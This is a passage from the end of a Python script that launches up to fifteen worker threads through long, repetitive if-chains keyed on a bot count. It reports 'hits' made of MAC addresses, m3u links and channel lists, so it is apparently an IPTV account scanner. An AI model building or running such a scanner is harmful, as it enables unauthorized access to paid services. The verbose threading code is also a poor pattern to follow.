                        serieslist=list(listlink,macs,token,livel)
                    hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)


t1 = threading.Thread(target=d_logic, args=(1,))
t2 = threading.Thread(target=d_logic, args=(2,))
t3= threading.Thread(target=d_logic, args=(3,))
t4= threading.Thread(target=d_logic, args=(4,))
t5= threading.Thread(target=d_logic, args=(5,))
t6= threading.Thread(target=d_logic, args=(6,))
t7= threading.Thread(target=d_logic, args=(7,))
t8= threading.Thread(target=d_logic, args=(8,))
t9= threading.Thread(target=d_logic, args=(9,))
t10= threading.Thread(target=d_logic, args=(10,))
t11= threading.Thread(target=d_logic, args=(11,))
t12= threading.Thread(target=d_logic, args=(12,))
t13= threading.Thread(target=d_logic, args=(13,))
t14= threading.Thread(target=d_logic, args=(14,))
t15= threading.Thread(target=d_logic, args=(15,))

t1.start()
if botsay==2 or botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
    t2.start()
if botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
    t3.start()
if botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
    t4.start()
if botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
    t5.start()
if botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
    t6.start()
if botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
    t7.start()
if botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
    t8.start()
if botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
    t9.start()
if botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
    t10.start()
if  botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
    t11.start()
if botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
    t12.start()
if botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
    t13.start()
if botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
    t14.start()
if botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
    t15.start()

